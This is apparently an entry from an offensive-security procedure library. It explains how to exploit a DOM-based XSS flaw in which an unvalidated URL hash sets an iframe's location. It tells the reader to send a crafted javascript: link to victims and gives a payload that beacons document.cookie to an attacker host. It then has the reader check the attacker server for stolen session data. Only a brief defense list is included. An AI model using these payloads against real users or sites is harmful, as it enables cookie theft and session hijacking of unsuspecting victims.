---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: Execute JavaScript via Iframe Hash
tags:
  - xss
  - dom-xss
  - js-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:26.008Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute JavaScript via Iframe Hash

## Summary

This procedure demonstrates loading a malicious URL to trigger DOM-based XSS, where the unsanitized hash sets the iframe location, executing arbitrary JavaScript in the victim's browser.

## Description

The attack targets client-side JavaScript in functionLoad() that uses document.location.hash directly in PPTSld.location.replace(str) without validation. When a victim visits the crafted URL, the payload executes immediately, allowing actions like alerting the domain, stealing session data, or performing clicks on behalf of the user. This is a classic DOM XSS vector effective against users with JavaScript enabled, common in modern web apps. Expected outcomes include proof-of-concept alerts or real impacts like cookie exfiltration to an attacker-controlled server.

## Requirements

1. Crafted malicious URL from prior procedure
2. Victim browser with JS enabled
3. Network access to the target domain

## Defense

Defensive measures and detection strategies:

- Implement input validation to block javascript: and data: schemes in hashes
- Employ browser sandboxing or extensions to block unsafe iframe navigations
- Log and alert on unexpected JS execution or DOM manipulations in web apps

## Objectives

1. Trigger JS execution via the vulnerable iframe mechanism
2. Demonstrate impact such as data theft or session hijack
3. Validate the full exploit chain

## Instructions

### Step 1: Distribute Malicious URL

**Context**: Deliver the URL to the victim, e.g., via email or link sharing.

No command; share https://www.exampleframe.html#javascript:alert(document.domain).

> Expected: Victim clicks and loads the page.

### Step 2: Observe Payload Execution

**Context**: Upon page load, the JS extracts the hash and sets iframe location, running the payload.

Monitor in browser dev tools for execution.

> The alert(document.domain) fires, confirming control. For exfiltration, use #javascript:navigator.sendBeacon('https://attacker.com/steal', document.cookie).

### Step 3: Assess Impact

**Context**: Evaluate executed actions, such as checking for stolen data on attacker server.

Review network logs or alerts for signs of theft.

> Expected: Evidence of JS running in victim context, e.g., beacon request to attacker.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[js-execution]]
